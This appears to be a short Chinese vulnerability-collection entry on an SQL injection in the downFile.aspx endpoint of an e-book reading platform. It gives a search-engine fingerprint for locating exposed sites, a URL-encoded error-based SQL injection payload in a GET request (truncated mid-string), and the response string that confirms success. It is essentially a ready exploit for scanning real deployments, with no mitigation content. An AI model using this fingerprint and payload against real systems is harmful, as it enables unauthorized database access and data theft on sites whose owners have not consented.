# 电子图书阅读平台downFile存在SQL注入漏洞

电子图书阅读平台 ｜ SQL注入 ｜ —
- **指纹**：`body="/Index.aspx/SearchBy"`
- **请求**：`GET /web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2812`
- **响应特征**：200 qzqzq1qkxzq